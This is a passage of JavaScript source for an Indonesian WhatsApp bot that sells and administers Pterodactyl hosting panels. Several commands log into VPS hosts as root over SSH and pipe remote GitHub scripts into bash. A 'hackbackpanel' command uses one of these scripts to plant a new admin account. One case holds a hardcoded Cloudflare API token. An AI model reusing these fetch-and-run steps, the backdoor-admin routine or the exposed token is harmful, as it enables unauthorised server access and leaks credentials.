                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await vinzzoffc.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
await fs.unlinkSync(`./@hardenc${filename}.js`)
}
break
case "welcome": {
if (!text) return m.reply(`*Example* .${command} on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"`)
if (text.toLowerCase() == "on") {
if (welcome) return m.reply("*Welcome* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
welcome = true
m.reply("𝙎𝙐𝘾𝘾𝙀𝙎\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!welcome) return m.reply("*Welcome* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
welcome = false
m.reply("𝙎𝙐𝘾𝘾𝙀𝙎\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return m.reply(`*Example* .${command} on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot`)
}}
break
case "autoread": {
if (!text) return m.reply(`*Example* .${command} on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot`)
if (text.toLowerCase() == "on") {
if (autoread) return m.reply("*Autoread* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
autoread = true
m.reply("𝙎𝙐𝘾𝘾𝙀𝙎\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!autoread) return m.reply("*Autoread* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
autoread = false
m.reply("𝙎𝙐𝘾𝘾𝙀𝙎\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return m.reply(`*Example* .${command} on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot`)
}}
break
case "anticall": {
if (!text) return m.reply(`*Example* .${command} on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot`)
if (text.toLowerCase() == "on") {
if (anticall) return m.reply("*Anticall* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
anticall = true
m.reply("𝙎𝙐𝘾𝘾𝙀𝙎\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!anticall) return m.reply("*Anticall* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
anticall = false
m.reply("𝙎𝙐𝘾𝘾𝙀𝙎\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return m.reply(`*Example* .${command} on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot`)
}}
break
case "setting": case "settingbot": case "option": case "statusbot": {
var teks = `
*List Status Bot Settings :*

* Autoread : ${global.autoread ? "*𝘼𝙆𝙏𝙄𝙁✅*" : "*𝙏𝙄𝘿𝘼𝙆 𝘼𝙆𝙏𝙄𝙁❌*"}
* Anticall : ${global.anticall ? "*𝘼𝙆𝙏𝙄𝙁✅*" : "*𝙏𝙄𝘿𝘼𝙆 𝘼𝙆𝙄𝙏𝙁❌*"}
* Welcome : ${global.welcome ? "*𝘼𝙆𝙏𝙄𝙁✅*" : "*𝙏𝙄𝘿𝘼𝙆 𝘼𝙆𝙏𝙄𝙁 ❌*"}

*ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ :*
Ketik *.ᴀᴜᴏᴛᴏʀᴇᴀᴅ* ᴏɴ/ᴏғғ`
m.reply(teks)
}
break
case "linklog": {
let teks = `*乂 Link Login\n\n${domain}\nLoginV2 ${domainv2}`
m.reply(teks)}
break
case 'peler': case 'anj': case 'anjg': case 'kntl': case 'kontl': case 'kntol': case 'memek': case 'mmk': case 'ajg': case 'annjingg': case 'kntl': case 'puki': case 'yatim': case 'ytim': case 'bangsat': case 'kontol': case 'stress': case 'kimak': {
m.reply(`lu juga ${command} 😂`)
}
break
case "assalamu'alaikum": case "Assalamu'alaikum": case "assalamualaikum": case "Assalamualaikum": {
var teks = `Waalaikumsalam`
m.reply(teks)
}
break
case "cekidch": {
if (!text) return VinzzReply("linkchnya mana")
if (!text.includes("https://whatsapp.com/channel/")) return VinzzReply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await vinzzoffc.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy ID Channel\",\"id\":\"123456789\",\"copy_code\":\"${res.id}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m})
await vinzzoffc.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case 'cekidgc': {
if (!text) return VinzzReply("link gb nya mana")
if (!text.includes("https://whatsapp.com/")) return VinzzReply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/')[1]
let getGroups = await vinzzoffc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await vinzzoffc.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}────────────────────────`
}
}

break
             
        case "listusr":
               {
                  if (!isAdmin)
                     return VinzzReply(mess.fitur);
                  let page = args[0] ? args[0] : "1";
                  let f = await fetch(
                     domain + "/api/application/users?page=" + page,
                     {
                        method: "GET",
                        headers: {
                           Accept: "application/json",
                           "Content-Type": "application/json",
                           Authorization: "Bearer " + apikey,
                        },
                     }
                  );
                  let res = await f.json();
                  let users = res.data;
                  let teks = "List User Panel\n\n";
                  if (users && users.length > 0) {
                     for (let user of users) {
                        let u = user.attributes;
                        teks += `${u.id}. ${u.username}\n`;
                     }
                     m.reply(
                        teks +
                           `Untuk Melihat Detail Silahkan Ketik .delusr {iduser}`
                     );
                  } else {
                     m.reply("Tidak ada user yang terdaftar");
                  }
               }
break
      case "listsrv":
          {
            if (!isAdmin)
              return VinzzReply(mess.fitur);
            let page = args[0] ? args[0] : "1";
            let f = await fetch(
              domain + "/api/application/servers?page=" + page,
              {
                method: "GET",
                headers: {
                  Accept: "application/json",
                  "Content-Type": "application/json",
                  Authorization: "Bearer " + apikey,
                },
              }
            );
            let res = await f.json();
            let servers = res.data;
            let num = 1;
            let teks = `List Server Panel\n\n`;
            if (servers && servers.length > 0) {
              for (let server of servers) {
                let s = server.attributes;
                let f3 = await fetch(
                  domain +
                    "/api/client/servers/" +
                    s.uuid.split`-`[0] +
                    "/resources",
                  {
                    method: "GET",
                    headers: {
                      Accept: "application/json",
                      "Content-Type": "application/json",
                      Authorization: "Bearer " + capikey,
                    },
                  }
                );
                let data = await f3.json();
                teks += `${num++}. ID: ${s.id} Name: ${s.name} Status: ${
                  data.attributes ? data.attributes.current_state : s.status
                }\n`;
              }
              m.reply(`${teks}\n`);
            } else {
              m.reply(`Tidak Ada Server Panel`);
            }
          }
          break
case "domainmenu": {
await vinzzoffc.sendMessage(m.chat, {react: {text: '🔒', key: m.key}})
const text12 = `Hai Kontol @${sender.split("@")[0]}

❏━━『 *LIST DOMAIN* 』━━
┣•○⊱${prefix}d1 reselervinzz.my.id
┣•○⊱${prefix}subdo skyzoo|ipserver
┣•○⊱${prefix}domain domainlu
┗━═┅═━━━๑

*NOTE :*
•○⊱𝙎𝙚𝙨𝙖𝙢𝙖 𝙈𝙚𝙢𝙗𝙚𝙧 𝘿𝙞 𝙇𝙖𝙧𝙖𝙣𝙜 𝙎𝙖𝙡𝙞𝙣𝙜 𝘿𝘿𝙊𝙎
•○⊱𝘽𝙤𝙡𝙚𝙝 𝘿𝙞 𝙋𝙖𝙠𝙚 𝙐𝙣𝙩𝙪𝙠 𝙒𝙃𝙈/𝘾𝙥𝙖𝙣𝙚𝙡 𝘼𝙨𝙖𝙡 𝙉𝙜𝙤𝙩𝙖𝙠
•○⊱𝘼𝙙𝙢𝙞𝙣 𝙂𝙖𝙣𝙩𝙚𝙣𝙜, 𝘾𝙤𝙣𝙩𝙤𝙝𝙣𝙮𝙖 © 𝙁𝙖𝙙𝙊𝙛𝙛𝙘`
vinzzoffc.sendMessage(m.chat, {text: text12, mentions: [m.sender]}, {quoted:m})
}
break
case "installpanel": {
if (!text) return m.reply(`*Example* .${command} ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*`)
let vii = text.split("|")
if (vii.length < 5) return m.reply(`*Example* .${command} ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*`)
let sukses = false

const ress = new Client();
const VinzzSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/VinzzOfficial/Auto-Install/refs/heads/main/cratenode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await vinzzoffc.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(VinzzSettings);
}
break
case "uninstallpanel": {
if (!text || !text.split("|")) return m.reply(`*Example* .${command} ipvps|pwvps`)
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(`*Example* .${command} ipvps|pwvps|domain`)
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const VinzzSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(VinzzSettings)
}
break
case "hbpanel": case "hackbackpanel": {
let t = text.split('|')
if (t.length < 2) return m.reply(`*Example* .${command} ipvps|pwvps`)

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const VinzzSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/VinzzOfficial/Auto-Install/refs/heads/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
* *Domain :* ${domain}
`
await vinzzoffc.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(VinzzSettings);
}
case "uninstalltema": {
if (!text || !text.split("|")) return m.reply(`*Example* .${command} ipvps|pwvps`)
let vii = text.split("|")
if (vii.length < 2) return m.reply(`*Example* .${command} ipvps|pwvps`)
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/VinzzOfficial/Auto-Install/refs/heads/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
case "installtemastellar": case "installtemastelar": {
if (!text || !text.split("|")) return m.reply(`*Example* .${command} ipvps|pwvps`)
let vii = text.split("|")
if (vii.length < 2) return m.reply(`*Example* .${command} ipvps|pwvps`)
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/VinzzOfficial/Auto-Install/refs/heads/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
case "domain": {
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break
case "subdomain": case "subdo": {
if (!text) return m.reply(`*Example* .${command} skyzoo|ipserver`)
if (!text.split("|")) return m.reply(`*Example* .${command} skyzoo|ipserver`)
let [host, ip] = text.split("|")
let dom = await Object.keys(global.subdomain)
let list = []
for (let i of dom) {
await list.push({
title: i, 
id: `.domain ${dom.indexOf(i) + 1} ${host}|${ip}`
})
}
await vinzzoffc.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: 'List Domain',
              highlight_label: 'Recommended',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Domain Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break
case 'domain1': case 'd1': {
await vinzzoffc.sendMessage(m.chat, {react: {text: '🔒', key: m.key}})

function subDomain1(host, ip) {
  return new Promise((resolve) => {
    let zone = "ae68c4019bbdaab4d067a077c2b3b0dc";
    let apitoken = "LeuiuewR5b9mx674GNnOSWjlXfcXe5pYJ4_6WDNz";
    let tld = "fadpediaa.biz.id";
    axios
      .post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
        {
          headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
          },
        }
      )
      .then((e) => {
        let res = e.data;
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambahkan Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname : ${e['name']}_\n_Bot Subdomain : FadCpanelxSubdo_\n\n*_Subdomain By Fad_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break        
case "delsrv": {
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
await vinzzoffc.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*SERVER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break
case "delusr": {        
let usr = args[0]
if (!usr) return m.reply('ID nya mana?')
await vinzzoffc.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*USER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE USER*')
}
break
case "delpanel": {        
let panel = args[0]
if (!panel) return m.reply('ID nya mana?')
await vinzzoffc.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
let f = await fetch(domain + "/api/application/servers/" + panel, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let f2 = await fetch(domain + "/api/application/users/" + panel, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*USER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE PANEL*')
}
break
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!text) return m.reply(`*Example* .${command} username`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '⏰', key: m.key}})
global.panel = text
var ram
var disk
var cpu
if (command == "1gb") {
ram = "1000"
disk = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disk = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disk = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disk = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disk = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disk = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disk = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disk = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disk = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disk = "5000"
cpu = "220"
} else {
ram = "0"
disk = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@vinzz.com"
let name = (username)
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return VinzzReply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let usr_id = user.id
let egg = global.eggsnya
let loc = global.location
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return VinzzReply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply(`✅ suscessfully created an account, data has been sent to your private chat *#by vinzz*
⚡ user id: ${user.id}`)

} else {
orang = m.chat
}
var teks = `*_📦PESANAN PANEL SUDAH DI KIRIM NI BOS_*


*_BERIKUT DETAIL AKUN ANDA_*

* *🪩ɪᴅ sᴇʀᴠᴇʀ :* ${user.id}
* *👤ᴜsᴇʀɴᴀᴍᴇ :* ${user.username}
* *🔐ᴘᴀssᴡᴏʀᴅ :* ${password}
* *👑ʟᴏɢɪɴ :* ${domain}


*INFO PANEL⚔️* : ${chvinzz}

*📝NOTE :*
